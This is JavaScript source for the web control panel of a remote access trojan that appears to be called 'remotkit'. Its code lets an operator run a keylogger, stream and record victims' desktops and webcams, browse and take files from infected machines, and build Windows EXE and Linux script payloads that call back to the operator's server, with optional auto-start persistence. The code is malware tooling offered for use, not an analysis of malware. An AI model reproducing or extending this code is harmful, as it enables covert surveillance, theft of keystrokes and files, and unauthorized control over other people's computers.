const socket = io();

let clients = {};
let selectedClientId = null;
let desktopActive = false;
let cameraActive = false;
let currentPath = 'C:\\';

let downloadChunks = {};

// DOM Elements
let dashboardTab, builderTab, aboutTab, btnDashboard, btnBuilder, btnAbout;
let clientsGrid, actionPanel, selectedNameSpan;
let totalSpan, onlineSpan, offlineSpan, serverIpSpan, buildStatusSpan;
let logArea, keylogDisplay, desktopFrame, cameraFrame, fileList, pathDisplay;
let btnInfo, startDesktop, stopDesktop, startDesktopRecord, stopDesktopRecord, desktopRecordStatus;
let startCamera, stopCamera, startCameraRecord, stopCameraRecord;
let refreshFiles, goUp, uploadArea, fileInput;
let startKey, stopKey, saveKey, clearKey, closeAction, refreshClientBtn;
let btnUninstall;
let fileSec, keySec, desktopSec, cameraSec;
let btnFile, btnKey, btnDesktop, btnCamera;

// Builder Elements
let buildExeIp, buildExeBtn, autoStartExe, buildExeFilename;
let buildLinuxIp, buildLinuxBtn, autoStartLinux, buildLinuxFilename;
let exeBuildProgress, progressFill, progressText;

document.addEventListener('DOMContentLoaded', () => {
    // Initialize DOM elements
    dashboardTab = document.getElementById('dashboardTab');
    builderTab = document.getElementById('builderTab');
    aboutTab = document.getElementById('aboutTab');
    btnDashboard = document.getElementById('btnDashboard');
    btnBuilder = document.getElementById('btnBuilder');
    btnAbout = document.getElementById('btnAbout');
    clientsGrid = document.getElementById('clientsGrid');
    actionPanel = document.getElementById('actionPanel');
    selectedNameSpan = document.getElementById('selectedClientName');
    totalSpan = document.getElementById('totalClients');
    onlineSpan = document.getElementById('onlineClients');
    offlineSpan = document.getElementById('offlineClients');
    serverIpSpan = document.getElementById('serverIp');
    buildStatusSpan = document.getElementById('buildStatus');
    
    // Builder elements
    buildExeIp = document.getElementById('buildExeServerIp');
    buildExeBtn = document.getElementById('buildExeBtn');
    autoStartExe = document.getElementById('autoStartCheckExe');
    buildExeFilename = document.getElementById('buildExeFilename');
    
    buildLinuxIp = document.getElementById('buildLinuxIp');
    buildLinuxBtn = document.getElementById('buildLinuxBtn');
    autoStartLinux = document.getElementById('autoStartCheckLinux');
    buildLinuxFilename = document.getElementById('buildLinuxFilename');
    
    exeBuildProgress = document.getElementById('exeBuildProgress');
    progressFill = document.querySelector('.progress-fill');
    progressText = document.querySelector('.progress-text');
    
    // Feature elements
    logArea = document.getElementById('logArea');
    keylogDisplay = document.getElementById('keylogDisplay');
    desktopFrame = document.getElementById('desktopFrame');
    cameraFrame = document.getElementById('cameraFrame');
    fileList = document.getElementById('fileList');
    pathDisplay = document.getElementById('currentPathDisplay');
    btnInfo = document.getElementById('btnInfo');
    startDesktop = document.getElementById('startDesktopBtn');
    stopDesktop = document.getElementById('stopDesktopBtn');
    startDesktopRecord = document.getElementById('startDesktopRecordBtn');
    stopDesktopRecord = document.getElementById('stopDesktopRecordBtn');
    desktopRecordStatus = document.getElementById('desktopRecordStatus');
    startCamera = document.getElementById('startCameraBtn');
    stopCamera = document.getElementById('stopCameraBtn');
    startCameraRecord = document.getElementById('startCameraRecordBtn');
    stopCameraRecord = document.getElementById('stopCameraRecordBtn');
    refreshFiles = document.getElementById('refreshFilesBtn');
    goUp = document.getElementById('goUpBtn');
    uploadArea = document.getElementById('uploadArea');
    fileInput = document.getElementById('fileInput');
    startKey = document.getElementById('startKeyloggerBtn');
    stopKey = document.getElementById('stopKeyloggerBtn');
    saveKey = document.getElementById('saveKeylogBtn');
    clearKey = document.getElementById('clearKeylogBtn');
    closeAction = document.getElementById('closeActionBtn');
    refreshClientBtn = document.getElementById('refreshClientBtn');
    btnUninstall = document.getElementById('btnUninstall');
    fileSec = document.getElementById('fileExplorerSection');
    keySec = document.getElementById('keyloggerSection');
    desktopSec = document.getElementById('desktopSection');
    cameraSec = document.getElementById('cameraSection');
    btnFile = document.getElementById('btnShowFileExplorer');
    btnKey = document.getElementById('btnShowKeylogger');
    btnDesktop = document.getElementById('btnShowDesktop');
    btnCamera = document.getElementById('btnShowCamera');
    
    // Load initial data
    loadServerInfo();
    refreshClients();
    setupEvents();
    
    // Heartbeat every 20 seconds
    setInterval(() => { if (socket.connected) socket.emit('ping'); }, 20000);
    setInterval(refreshClients, 5000);
});

function setupEvents() {
    // Tab switching
    if (btnDashboard) btnDashboard.onclick = () => switchTab('dashboard');
    if (btnBuilder) btnBuilder.onclick = () => switchTab('builder');
    if (btnAbout) btnAbout.onclick = () => switchTab('about');
    
    // Action panel
    if (closeAction) closeAction.onclick = () => { 
        actionPanel.classList.remove('active'); 
        selectedClientId = null; 
        renderClients(); 
        hideAllSections(); 
    };
    if (refreshClientBtn) refreshClientBtn.onclick = () => { 
        if(selectedClientId) sendCommand('info'); 
    };
    
    // Feature buttons
    if (btnFile) btnFile.onclick = () => { 
        hideAllSections(); 
        if(fileSec) fileSec.style.display = 'block'; 
        refreshFileList(); 
    };
    if (btnKey) btnKey.onclick = () => { 
        hideAllSections(); 
        if(keySec) keySec.style.display = 'block'; 
    };
    if (btnDesktop) btnDesktop.onclick = () => { 
        hideAllSections(); 
        if(desktopSec) desktopSec.style.display = 'block'; 
    };
    if (btnCamera) btnCamera.onclick = () => { 
        hideAllSections(); 
        if(cameraSec) cameraSec.style.display = 'block'; 
    };
    
    // Close sections
    document.querySelectorAll('.close-section').forEach(btn => { 
        btn.onclick = () => { 
            let sec = document.getElementById(btn.getAttribute('data-section')); 
            if(sec) sec.style.display = 'none'; 
        }; 
    });
    
    // Client commands
    if (btnInfo) btnInfo.onclick = () => sendCommand('info');
    
    if (btnUninstall) {
        btnUninstall.addEventListener('click', async () => {
            if (!selectedClientId) {
                addLog('Select client first', 'error');
                return;
            }
            if (confirm('⚠️ WARNING: This will remove Auto-start registry and disconnect the client!\n\nContinue?')) {
                addLog('🗑️ Uninstalling client...', 'info');
                const result = await sendCommandAndWait('uninstall');
                addLog(`✅ ${result || 'Uninstall completed'}`, 'received');
            }
        });
    }
    
    // File explorer
    if (refreshFiles) refreshFiles.onclick = refreshFileList;
    if (goUp) goUp.onclick = goUpDir;
    if (uploadArea) uploadArea.onclick = () => fileInput.click();
    if (fileInput) fileInput.onchange = (e) => { 
        if(e.target.files && e.target.files[0]) uploadFile(e.target.files[0]); 
        e.target.value = ''; 
    };
    
    // Keylogger
    if (startKey) startKey.onclick = () => sendCommand('start_keylogger');
    if (stopKey) stopKey.onclick = () => sendCommand('stop_keylogger');
    if (saveKey) saveKey.onclick = () => { 
        if(keylogDisplay && keylogDisplay.innerText) { 
            let blob = new Blob([keylogDisplay.innerText]); 
            let a = document.createElement('a'); 
            a.download = `keylog_${Date.now()}.txt`; 
            a.href = URL.createObjectURL(blob); 
            a.click(); 
            URL.revokeObjectURL(a.href); 
            addLog('Keylog saved','info'); 
        } else addLog('No data','error'); 
    };
    if (clearKey) clearKey.onclick = () => { 
        if(keylogDisplay) keylogDisplay.innerHTML = ''; 
        addLog('Cleared','info'); 
    };
    
    // Desktop
    if (startDesktop) startDesktop.onclick = () => { 
        if(!selectedClientId){addLog('Select client','error');return;} 
        sendCommand('start_desktop'); 
        desktopActive=true; 
        desktopFrame.style.display='block'; 
        addLog('Desktop started','info'); 
    };
    if (stopDesktop) stopDesktop.onclick = () => { 
        sendCommand('stop_desktop'); 
        desktopActive=false; 
        addLog('Desktop stopped','info'); 
    };
    if (startDesktopRecord) startDesktopRecord.onclick = () => { 
        if(!desktopActive){addLog('Start desktop first','error');return;} 
        sendCommand('start_desktop_recording'); 
        if(desktopRecordStatus) desktopRecordStatus.innerHTML='🔴 RECORDING...'; 
        addLog('Recording started','info'); 
    };
    if (stopDesktopRecord) stopDesktopRecord.onclick = () => { 
        sendCommand('stop_desktop_recording'); 
        if(desktopRecordStatus) desktopRecordStatus.innerHTML=''; 
        addLog('Recording stopped','info'); 
    };
    
    // Camera
    if (startCamera) startCamera.onclick = () => { 
        if(!selectedClientId){addLog('Select client','error');return;} 
        sendCommand('start_camera'); 
        cameraActive=true; 
        cameraFrame.style.display='block'; 
        addLog('Camera started','info'); 
    };
    if (stopCamera) stopCamera.onclick = () => { 
        sendCommand('stop_camera'); 
        cameraActive=false; 
        addLog('Camera stopped','info'); 
    };
    if (startCameraRecord) startCameraRecord.onclick = () => { 
        if(!cameraActive){addLog('Start camera first','error');return;} 
        sendCommand('start_camera_recording'); 
        addLog('Camera recording started','info'); 
    };
    if (stopCameraRecord) stopCameraRecord.onclick = () => { 
        sendCommand('stop_camera_recording'); 
        addLog('Camera recording stopped','info'); 
    };
    
    // Build buttons
    if (buildExeBtn) buildExeBtn.onclick = buildClientExe;
    if (buildLinuxBtn) buildLinuxBtn.onclick = buildLinux;
    
    // Build status from socket
    socket.on('build_status', (data) => {
        if (buildStatusSpan) buildStatusSpan.innerText = data.status === 'complete' ? 'Ready' : 'Building...';
        if (data.status === 'complete') {
            if (exeBuildProgress) exeBuildProgress.style.display = 'none';
            if (progressFill) progressFill.style.width = '100%';
            if (progressText) progressText.innerText = 'Build complete!';
            setTimeout(() => {
                if (progressFill) progressFill.style.width = '0%';
                if (progressText) progressText.innerText = 'Building executable...';
            }, 2000);
        } else if (data.status === 'error') {
            if (exeBuildProgress) exeBuildProgress.style.display = 'none';
            addLog(`Build error: ${data.message}`, 'error');
        }
    });
}

function sendCommandAndWait(type, data = {}) {
    return new Promise((resolve) => {
        if (!selectedClientId) {
            resolve(null);
            return;
        }
        
        const waitId = 'wait_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        
        const resultHandler = (resultData) => {
            if (resultData && resultData.wait_id === waitId) {
                socket.off('command_result', resultHandler);
                resolve(resultData.result);
            }
        };
        
        socket.on('command_result', resultHandler);
        
        socket.emit('command', {
            client_id: selectedClientId,
            type: type,
            data: { ...data, wait_id: waitId }
        });
        
        setTimeout(() => {
            socket.off('command_result', resultHandler);
            resolve(null);
        }, 10000);
    });
}

function switchTab(tab) {
    if (tab === 'dashboard') {
        if (dashboardTab) dashboardTab.classList.add('active');
        if (builderTab) builderTab.classList.remove('active');
        if (aboutTab) aboutTab.classList.remove('active');
        if (btnDashboard) btnDashboard.classList.add('active');
        if (btnBuilder) btnBuilder.classList.remove('active');
        if (btnAbout) btnAbout.classList.remove('active');
        refreshClients();
    } else if (tab === 'builder') {
        if (dashboardTab) dashboardTab.classList.remove('active');
        if (builderTab) builderTab.classList.add('active');
        if (aboutTab) aboutTab.classList.remove('active');
        if (btnDashboard) btnDashboard.classList.remove('active');
        if (btnBuilder) btnBuilder.classList.add('active');
        if (btnAbout) btnAbout.classList.remove('active');
    } else if (tab === 'about') {
        if (dashboardTab) dashboardTab.classList.remove('active');
        if (builderTab) builderTab.classList.remove('active');
        if (aboutTab) aboutTab.classList.add('active');
        if (btnDashboard) btnDashboard.classList.remove('active');
        if (btnBuilder) btnBuilder.classList.remove('active');
        if (btnAbout) btnAbout.classList.add('active');
        loadServerInfo();
    }
}

function hideAllSections() { 
    if(fileSec) fileSec.style.display='none'; 
    if(keySec) keySec.style.display='none'; 
    if(desktopSec) desktopSec.style.display='none'; 
    if(cameraSec) cameraSec.style.display='none'; 
}

async function updateStats() { 
    try{ 
        let r=await fetch('/api/stats'); 
        let s=await r.json(); 
        if(totalSpan) totalSpan.innerText=s.total||0; 
        if(onlineSpan) onlineSpan.innerText=s.online||0; 
        if(offlineSpan) offlineSpan.innerText=s.offline||0; 
    } catch(e){} 
}

async function loadServerInfo() { 
    try{ 
        let r=await fetch('/api/info'); 
        let i=await r.json(); 
        if(serverIpSpan) serverIpSpan.innerText=i.ip||'?'; 
        if(buildExeIp) buildExeIp.value=i.ip||''; 
        if(buildLinuxIp) buildLinuxIp.value=i.ip||''; 
        if(buildAndroidIp) buildAndroidIp.value=i.ip||''; 
        
        // Update about page info
        if (document.getElementById('aboutServerIp')) {
            document.getElementById('aboutServerIp').innerText = i.ip || '?';
            document.getElementById('aboutPort').innerText = i.port || '?';
            document.getElementById('aboutPlatform').innerText = i.platform || '?';
            document.getElementById('aboutPython').innerText = i.python_version || '?';
        }
    } catch(e){} 
}

async function refreshClients() { 
    try{ 
        let r=await fetch('/api/clients'); 
        clients=await r.json()||{}; 
        renderClients(); 
        updateStats(); 
    } catch(e){} 
}

function renderClients() {
    let list = Object.values(clients);
    if(!clientsGrid) return;
    if(list.length===0){ 
        clientsGrid.innerHTML='<div style="text-align:center;padding:40px;opacity:0.5;"><i class="fas fa-desktop" style="font-size:2rem;"></i><p style="margin-top:10px;">No devices connected</p></div>'; 
        return; 
    }
    clientsGrid.innerHTML='';
    list.forEach(client => {
        if(!client||!client.id) return;
        let card = document.createElement('div');
        card.className = `client-card ${client.status!=='online'?'offline':''} ${selectedClientId===client.id?'selected':''}`;
        let osIcon = client.os && client.os.includes('Windows') ? 'fa-windows' : (client.os && client.os.includes('Linux') ? 'fa-linux' : 'fa-android');
        card.innerHTML = `<div class="client-header"><span class="client-name"><i class="fab ${osIcon}"></i> ${escapeHtml(client.name)}</span><div class="client-status ${client.status!=='online'?'offline':''}"></div></div><div style="font-size:0.65rem;opacity:0.5;">${escapeHtml(client.ip)}</div>`;
        card.onclick = (e) => { e.stopPropagation(); if(selectedClientId===client.id){ selectedClientId=null; actionPanel.classList.remove('active'); hideAllSections(); renderClients(); } else selectClient(client.id); };
        clientsGrid.appendChild(card);
    });
}

function selectClient(id) {
    selectedClientId = id;
    let client = clients[id];
    if(client && actionPanel && selectedNameSpan){
        selectedNameSpan.innerText = client.name;
        actionPanel.classList.add('active');
        hideAllSections();
        currentPath = 'C:\\';
        if(pathDisplay) pathDisplay.innerText = currentPath;
        if(keylogDisplay) keylogDisplay.innerHTML = '';
        desktopActive = false; cameraActive = false;
        if(desktopFrame) desktopFrame.style.display = 'none';
        if(cameraFrame) cameraFrame.style.display = 'none';
        if(desktopRecordStatus) desktopRecordStatus.innerHTML = '';
    }
    renderClients();
}

function sendCommand(type, data={}){ 
    if(!selectedClientId){ addLog('Select client','error'); return; } 
    socket.emit('command',{client_id:selectedClientId,type:type,data:data}); 
    addLog(`Sent: ${type}`,'sent'); 
}

async function refreshFileList(){
    if(!selectedClientId){ if(fileList) fileList.innerHTML='<div style="text-align:center;padding:20px;">Select client</div>'; return; }
    if(fileList) fileList.innerHTML='<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
    try{
        let r=await fetch('/api/listdir',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:selectedClientId,path:currentPath})});
        let d=await r.json();
        if(d.error){ if(fileList) fileList.innerHTML=`<div style="text-align:center;padding:20px;color:#ff4757;">${escapeHtml(d.error)}</div>`; return; }
        if(d.files) renderFileList(d.files);
        else if(fileList) fileList.innerHTML='<div style="text-align:center;padding:20px;">No files</div>';
    }catch(e){ if(fileList) fileList.innerHTML=`<div style="text-align:center;padding:20px;color:#ff4757;">Error: ${escapeHtml(e.message)}</div>`; }
}

function renderFileList(files){
    if(!fileList) return;
    if(!files||files.length===0){ fileList.innerHTML='<div style="text-align:center;padding:20px;">Empty directory</div>'; return; }
    fileList.innerHTML='';
    if(currentPath!=='/' && currentPath!=='C:\\' && currentPath!=='D:\\'){
        let p=document.createElement('div'); p.className='file-item'; p.innerHTML='<i class="fas fa-level-up-alt"></i> <strong>..</strong>'; p.onclick=()=>{ let parts=currentPath.split('\\'); parts.pop(); currentPath=parts.join('\\')||'C:\\'; refreshFileList(); }; fileList.appendChild(p);
    }
    files.forEach(file=>{
        let div=document.createElement('div'); div.className=`file-item ${file.is_dir?'folder':''}`;
        let size=file.is_dir?'':` (${formatFileSize(file.size)})`;
        let icon=file.is_dir?'<i class="fas fa-folder"></i>':'<i class="fas fa-file"></i>';
        div.innerHTML = `<div style="display:flex;align-items:center;gap:8px;flex:1;">${icon}<span>${escapeHtml(file.name)}${size}</span></div>${!file.is_dir?`<button class="download-btn" data-path="${escapeHtml(file.path)}">Download</button>`:''}`;
        if(file.is_dir) div.onclick=()=>{ currentPath=file.path; refreshFileList(); };
        else{ let btn=div.querySelector('.download-btn'); if(btn) btn.onclick=(e)=>{ e.stopPropagation(); downloadFile(file.path); }; }
        fileList.appendChild(div);
    });
}

function formatFileSize(bytes){ if(bytes<1024) return bytes+' B'; if(bytes<1024*1024) return (bytes/1024).toFixed(1)+' KB'; return (bytes/(1024*1024)).toFixed(1)+' MB'; }

function saveBlobAsFile(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

async function downloadFile(filePath) {
    if (!selectedClientId) {
        addLog('No client selected', 'error');
        return;
    }
    addLog(`Downloading: ${filePath}`, 'info');
    try {
        const response = await fetch('/api/download', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ client_id: selectedClientId, file_path: filePath })
        });
        const data = await response.json();
        if (data.error) {
            addLog(`Download failed: ${data.error}`, 'error');
            return;
        }
        if (data.content) {
            const binaryString = atob(data.content);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            const blob = new Blob([bytes]);
            saveBlobAsFile(blob, data.filename || filePath.split('\\').pop() || 'downloaded_file');
            addLog(`✅ Downloaded: ${data.filename}`, 'received');
        }
    } catch (error) {
        addLog(`Download error: ${error.message}`, 'error');
    }
}

function goUpDir(){ if(currentPath==='C:\\'||currentPath==='D:\\') return; let parts=currentPath.split('\\'); parts.pop(); currentPath=parts.join('\\')||'C:\\'; refreshFileList(); }

async function uploadFile(file){
    if(!selectedClientId){ addLog('No client selected','error'); return; }
    addLog(`Uploading: ${file.name}`,'info');
    let reader=new FileReader();
    reader.onload=async function(e){
        try{
            let r=await fetch('/api/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:selectedClientId,file_name:file.name,file_path:currentPath,content:e.target.result.split(',')[1]})});
            let d=await r.json();
            if(d.success){ addLog(`Uploaded: ${file.name}`,'received'); refreshFileList(); } else addLog(`Upload failed`,'error');
        }catch(e){ addLog(`Error: ${e.message}`,'error'); }
    };
    reader.readAsDataURL(file);
}

function addLog(msg,type='info'){
    if(!logArea) return;
    let time=new Date().toLocaleTimeString();
    let colors={sent:'#00d9ff',received:'#00d26a',info:'#a8c0ff',error:'#ff4757'};
    let div=document.createElement('div'); div.className='response-item'; div.style.borderLeftColor=colors[type]||'#667eea';
    div.innerHTML = `<div style="font-size:0.55rem;opacity:0.5;">[${time}]</div>${escapeHtml(msg)}`;
    logArea.insertBefore(div,logArea.firstChild);
    while(logArea.children.length>50) logArea.removeChild(logArea.lastChild);
}

function addKeylog(text){ if(!keylogDisplay) return; let div=document.createElement('div'); div.innerHTML=escapeHtml(text); keylogDisplay.appendChild(div); keylogDisplay.scrollTop=keylogDisplay.scrollHeight; while(keylogDisplay.children.length>200) keylogDisplay.removeChild(keylogDisplay.firstChild); }

function escapeHtml(text){ if(!text) return ''; return String(text).replace(/[&<>]/g,m=>m==='&'?'&amp;':(m==='<'?'&lt;':'&gt;')); }

// ========== BUILDER FUNCTIONS ==========

async function buildClientExe() {
    let ip = buildExeIp.value;
    if(!ip){ alert('Enter server IP'); return; }
    
    let customName = buildExeFilename.value.trim();
    
    if(buildExeBtn) {
        buildExeBtn.disabled = true;
        buildExeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Building...';
    }
    if(exeBuildProgress) exeBuildProgress.style.display = 'block';
    if(progressFill) progressFill.style.width = '30%';
    if(progressText) progressText.innerText = 'Building executable (may take 30-120 seconds)...';
    if(buildStatusSpan) buildStatusSpan.innerText = 'Building...';
    
    try {
        let progressInterval = setInterval(() => {
            if(progressFill && progressFill.style.width !== '100%') {
                let current = parseInt(progressFill.style.width) || 30;
                if(current < 90) progressFill.style.width = (current + 10) + '%';
            }
        }, 5000);
        
        let r = await fetch('/api/build_exe', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({
                os_type: 'windows',
                server_ip: ip,
                auto_start: autoStartExe.checked,
                custom_name: customName
            })
        });
        
        clearInterval(progressInterval);
        
        if(r.ok){
            if(progressFill) progressFill.style.width = '100%';
            if(progressText) progressText.innerText = 'Downloading...';
            
            let blob = await r.blob();
            let url = URL.createObjectURL(blob);
            let a = document.createElement('a');
            let filename = customName ? `${customName}.exe` : 'remotkit_client.exe';
            
            a.download = filename;
            a.href = url;
            a.click();
            URL.revokeObjectURL(url);
            addLog(`✅ EXE downloaded: ${filename}`, 'info');
            if(buildStatusSpan) buildStatusSpan.innerText = 'Ready';
            
            setTimeout(() => {
                if(progressFill) progressFill.style.width = '0%';
                if(exeBuildProgress) exeBuildProgress.style.display = 'none';
            }, 2000);
        } else {
            let error = await r.json();
            alert('Build failed: ' + (error.error || 'Unknown error'));
            if(exeBuildProgress) exeBuildProgress.style.display = 'none';
            if(buildStatusSpan) buildStatusSpan.innerText = 'Error';
        }
    } catch(e){ 
        alert('Error: '+e.message);
        if(exeBuildProgress) exeBuildProgress.style.display = 'none';
        if(buildStatusSpan) buildStatusSpan.innerText = 'Error';
    }
    finally{ 
        if(buildExeBtn) {
            buildExeBtn.disabled = false;
            buildExeBtn.innerHTML = '<i class="fas fa-cogs"></i> Build Windows EXE';
        }
    }
}

async function buildLinux() {
    let ip = buildLinuxIp.value;
    if(!ip){ alert('Enter server IP'); return; }
    let customName = buildLinuxFilename.value.trim();
    
    if(buildLinuxBtn) {
        buildLinuxBtn.disabled = true;
        buildLinuxBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
    }
    
    try {
        let r = await fetch('/api/build', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({
                os_type: 'linux',
                output_type: 'script',
                server_ip: ip,
                auto_start: autoStartLinux.checked,
                custom_name: customName
            })
        });
        
        if(r.ok){
            let blob = await r.blob();
            let url = URL.createObjectURL(blob);
            let a = document.createElement('a');
            let filename = customName ? `${customName}.py` : 'remotkit_linux.py';
            a.download = filename;
            a.href = url;
            a.click();
            URL.revokeObjectURL(url);
            addLog(`✅ Linux script downloaded: ${filename}`, 'info');
        } else alert('Build failed');
    } catch(e){ alert('Error: '+e.message); }
    finally{ 
        if(buildLinuxBtn) {
            buildLinuxBtn.disabled = false;
            buildLinuxBtn.innerHTML = '<i class="fas fa-download"></i> Download Linux Script';
        }
    }
}

// Socket events
socket.on('connect',()=>{ addLog('Connected to server','info'); loadServerInfo(); refreshClients(); });
socket.on('connect_error',(e)=>{ addLog(`Connection error: ${e.message}`,'error'); });
socket.on('disconnect',()=>{ addLog('Disconnected from server','error'); });
socket.on('clients_update',(data)=>{ clients=data||{}; renderClients(); updateStats(); });
socket.on('command_result',(data)=>{
    if(data&&data.result){
        if(data.result.includes('[KEYLOG]')) addKeylog(data.result);
        else addLog(`Result: ${String(data.result).substring(0,200)}`,'received');
    }
});
socket.on('desktop_frame',(data)=>{ if(data&&data.image&&desktopActive&&desktopFrame){ desktopFrame.src=`data:image/jpeg;base64,${data.image}`; desktopFrame.style.display='block'; } });
socket.on('camera_frame',(data)=>{ if(data&&data.image&&cameraActive&&cameraFrame){ cameraFrame.src=`data:image/jpeg;base64,${data.image}`; cameraFrame.style.display='block'; } });